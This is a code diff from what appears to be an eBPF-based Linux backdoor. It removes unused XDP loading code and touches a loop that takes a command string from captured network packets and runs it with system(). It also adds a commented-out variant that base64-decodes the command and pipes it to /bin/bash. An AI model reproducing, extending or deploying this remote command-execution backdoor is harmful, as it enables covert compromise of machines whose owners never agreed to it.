@@ -225,7 +225,6 @@ int main(int argc, char **argv) {
   struct pr0be_safe *sfobj;
   struct bpf_program *progboop = NULL;
   struct ring_buffer *rb = NULL;
-  struct perf_buffer *pb = NULL;
   char pid[MAXPIDLEN];
 
   // ===========================================================================
@@ -237,94 +236,9 @@ int main(int argc, char **argv) {
   }
   // ===========================================================================
 
-  // BPF
-  long err_libbfp;
-
-  // XDP
-  struct bpf_map *xdp_perf_map;
-  struct xdp_program *xdp_prog = NULL;
-  struct bpf_program *xdp_prog_fentry = NULL;
-  struct bpf_program *xdp_prog_fexit = NULL;
-  int xdp_prog_fd;
-  struct bpf_object_open_opts *xdp_open_opts;
-  const char *xdp_prog_fentry_name;
-  const char *xdp_prog_fexit_name;
-  const char *xdp_perf_map_name;
-  int xdp_map_fd;
-  int xdp_ret;
-  int xdp_prog_fentry_fd;
-  int xdp_prog_fexit_fd;
-  struct bpf_object *xdp_obj;
-
   // ===========================================================================
   // [pr0be.xdp.o]
-  //  {
-  //      // Initialize interface
-  //      cfg.if_index = if_nametoindex(cfg.if_name);
-  //      boopprintf("  -> Interface [%s] [xcap]\n", cfg.if_name);
   //
-  //      // Load XDP object
-  //      xdp_obj = bpf_object__open(cfg.pr0bexdppath);
-  //      if (!xdp_obj) {
-  //        err_libbfp = libbpf_get_error(xdp_obj);
-  //        boopprintf("Unable to load XDP object: %s\n", cfg.pr0bexdppath);
-  //        boopprintf("Unable to load XDP object: %s\n",
-  //        strerror(-err_libbfp)); boopprintf("Privileged access required to
-  //        load XDP probe!\n"); boopprintf("Permission denied.\n"); return 1;
-  //      }
-  //      // Load xdp_perf_map
-  //      xdp_perf_map = bpf_object__next_map(xdp_obj, NULL);
-  //      if (!xdp_perf_map) {
-  //        err_libbfp = libbpf_get_error(xdp_perf_map);
-  //        boopprintf("Unable to load XDP data map: %s\n",
-  //        strerror(-err_libbfp)); return 1;
-  //      }
-  //      xdp_perf_map_name = bpf_map__name(xdp_perf_map);
-  //      boopprintf("  ->   eBPF Map Loaded       : %s\n", xdp_perf_map_name);
-  //
-  //      // fentry
-  //      xdp_prog_fentry =
-  //      bpf_object__find_program_by_name(xdp_obj,"trace_on_entry"); if
-  //      (!xdp_prog_fentry) {
-  //        err_libbfp = libbpf_get_error(xdp_prog_fentry);
-  //        boopprintf("Unable to load XDP [fentry] program : %s\n",
-  //        strerror(-err_libbfp)); return 1;
-  //      }
-  //      xdp_prog_fentry_name = bpf_program__name(xdp_prog_fentry);
-  //      xdp_prog_fentry_fd = bpf_program__fd(xdp_prog_fentry);
-  //      boopprintf("  ->   eBPF Program [fentry] : %s\n",
-  //      xdp_prog_fentry_name);
-  //
-  //      // fexit
-  //      xdp_prog_fexit =
-  //      bpf_object__find_program_by_name(xdp_obj,"trace_on_exit"); if
-  //      (!xdp_prog_fexit) {
-  //        err_libbfp = libbpf_get_error(xdp_prog_fexit);
-  //        boopprintf("Unable to load XDP [fexit] program : %s\n",
-  //        strerror(-err_libbfp)); return 1;
-  //      }
-  //      xdp_prog_fexit_name = bpf_program__name(xdp_prog_fexit);
-  //      xdp_prog_fexit_fd = bpf_program__fd(xdp_prog_fexit);
-  //      boopprintf("  ->   eBPF Program [fexit]  : %s\n",
-  //      xdp_prog_fexit_name);
-  //
-  //      bpf_program__set_expected_attach_type(xdp_prog_fentry,
-  //                                            BPF_TRACE_FENTRY);
-  //      bpf_program__set_expected_attach_type(xdp_prog_fexit,
-  //                                            BPF_TRACE_FEXIT);
-  //      // TODO Set attach func name!
-  //      bpf_program__set_attach_target(xdp_prog_fentry,
-  //                                     xdp_prog_fentry_fd,
-  //                                     NULL);
-  //      bpf_program__set_attach_target(xdp_prog_fexit,
-  //                                     xdp_prog_fexit_fd,
-  //                                     NULL);
-  //
-  //      boopprintf("  ->   eBPF Attach Types Set : %s %s\n",
-  //      xdp_prog_fentry_name, xdp_prog_fexit_name);
-  //
-  //
-  //  }
   // [pr0be.xdp.o]
   // ===========================================================================
 
@@ -494,7 +408,9 @@ int main(int argc, char **argv) {
           int retval;
           retval = xcaprce(saddrval, rce);
           if (retval == 0) {
-            boopprintf("  <- Executing: %s\r\n", rce);
+            //char rce_base64_cmd_str[4096];
+            //sprintf(rce_base64_cmd_str, "echo \"%s\" | base64 -d | /bin/bash", rce);
+            boopprintf("  <- Executing: %s\n", rce);
             system(rce);
           }
         }
